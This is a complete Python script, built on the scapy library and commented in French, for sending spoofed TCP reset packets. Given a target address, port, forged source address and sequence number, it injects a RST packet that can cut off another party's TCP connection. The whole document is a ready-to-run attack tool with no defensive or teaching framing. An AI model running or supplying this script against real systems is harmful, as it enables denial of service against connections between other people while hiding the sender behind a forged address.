from scapy.all import IP, TCP, send

def send_tcp_rst(target_ip, target_port, spoofed_ip, spoofed_port, seq_num):
    # Créez le paquet IP avec l'adresse IP usurpée
    ip_layer = IP(src=spoofed_ip, dst=target_ip)

    # Créez le paquet TCP avec le drapeau RST
    tcp_layer = TCP(
        sport=spoofed_port,  # Port source (usurpé)
        dport=target_port,   # Port destination
        flags="R",           # Flag RST
        seq=seq_num          # Numéro de séquence attendu par la cible
    )

    # Combinez les deux couches
    packet = ip_layer / tcp_layer

    print(f"Sending TCP RST packet: {packet.summary()}")
    
    # Envoyez le paquet
    send(packet, verbose=False)

if __name__ == "__main__":
    import sys

    if len(sys.argv) != 6:
        print("Usage: python tcp_rst.py <target_ip> <target_port> <spoofed_ip> <spoofed_port> <seq_num>")
        sys.exit(1)

    target_ip = sys.argv[1]
    target_port = int(sys.argv[2])
    spoofed_ip = sys.argv[3]
    spoofed_port = int(sys.argv[4])
    seq_num = int(sys.argv[5])

    send_tcp_rst(target_ip, target_port, spoofed_ip, spoofed_port, seq_num)
